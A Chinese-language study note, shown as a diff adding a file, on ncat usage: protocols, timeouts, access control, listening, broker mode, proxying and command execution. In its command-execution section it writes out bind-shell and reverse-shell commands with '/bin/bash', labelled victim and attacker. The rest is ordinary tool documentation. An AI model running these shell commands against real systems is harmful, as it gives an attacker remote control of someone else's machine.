@@ -1,0 +1,119 @@
+教程：https://nmap.org/ncat/guide/index.html
+
+
+
+
+
+
+
+零 原理：和nc的原理一样（准确说nc、ncat、socat这仨网络测试工具原理都一样，三个一个比一个高级）：C/S模式。
+
+
+
+
+
+
+
+
+
+一 基本用法
+（零）基本选项
+1 -C：标识选项，可有可无。
+
+2 协议（默认tcp和ipv4协议）：
+（1）udp：--udp or -u
+（2）stcp：--sctp
+（3）ipv6：-6
+（4）tls：--ssl
+
+3 --nodns or -n：ban掉dns解析。
+
+4 -v：展示详细信息。
+
+5 --output or -o：输出日志
+
+6 --send-only和--recv-only
+
+7 --source （-s） 和 --source-port （-p）：仅用于连接，而不能用于-l，对nc而言相反。
+
+8 定时（默认是s，如需其他，请在数字后标明ms、m、h）：
+（1）--delay（-d）：
+让 Ncat 在每个离散读取或写入操作之间等待给定的时间。例如，--delay 500ms 强制延迟半秒。
+（2）--idle-timeout（-i）：
+允许在连接模式下设置读取和写入的超时。如果客户端在给定的时间段内无法读取或写入，则连接将被断开。这些选项在监听模式下不起作用。
+（3）--wait（-w简）：
+设置 Ncat 在连接模式下等待建立连接的时间。默认值为 10 秒。
+
+9 访问控制（后接IP地址、可使用CIDR表示法）：
+--allow 和 --deny
+--allowfile 和 --denyfile
+
+
+
+（一）设置ncat服务器
+1 ncat -l：
+（1）默认IP地址：INADDR_ANY
+（2）默认端口：31337
+
+2 ncat -l <listen-port>
+默认IP地址：INADDR_ANY
+
+3 ncat -l <listen-addr> <listen-port>
+
+
+
+
+
+（二）连接
+nc <listen-addr> <listen-port>
+
+
+
+
+
+
+
+二 高级用法
+（一）接收多条连接（--keep-open or -k）
+ncat -l <listen-addr> <listen-port> -k
+
+
+
+（二）连接代理（说白了就是群聊，--broker，但前提是开启-k）
+ncat -l <listen-addr> <listen-port> -k --broker
+
+
+
+（三）命令执行
+0 选项：
+（1）--exec （-e）：运行不带 shell 解释的命令。
+（2）--sh-exec：通过将字符串传递给系统 shell 来运行命令。
+（3）--lua-exec：使用 Ncat 的内置 Lua 解释器运行 Lua 程序。
+
+1 正向shell
+（1）victim：
+ncat <victim-listen-addr> <victim-listen-port> -l --exec "/bin/bash"
+ncat <victim-listen-addr> <victim-listen-port> -l --sh-exec "/bin/bash"
+（2）attacker：
+ncat <victim-listen-addr> <victim-listen-port>
+
+2 反向shell
+（1）attcker
+ncat <attacker-listen-addr> <attcker-listen-port> -l
+（2）victim
+ncat <attacker-listen-addr> <attcker-listen-port> -e /bin/bash
+
+
+
+（四）文件传输：和nc一样
+
+
+
+（五）代理
+1 客户端：ncat --proxy <proxyhost>[:<proxyport>] --proxy-type  { http  |   socks4  |   socks5 } <host> [<port>]
+默认proxy-type是http。
+
+2 服务器：
+（0）使用-e或-sh-exec。
+（1）比如：ncat -l 本地主机 143 --sh-exec “ncat --ssl imap.example.com 993”
+（2）上面这条命令，可以用于解除ssl限制，即比如IAMP服务器需要ssl，但是你的邮件客户端不支持ssl，就可以使用上面这条命令为你的邮件客户端做代理以支持ssl。
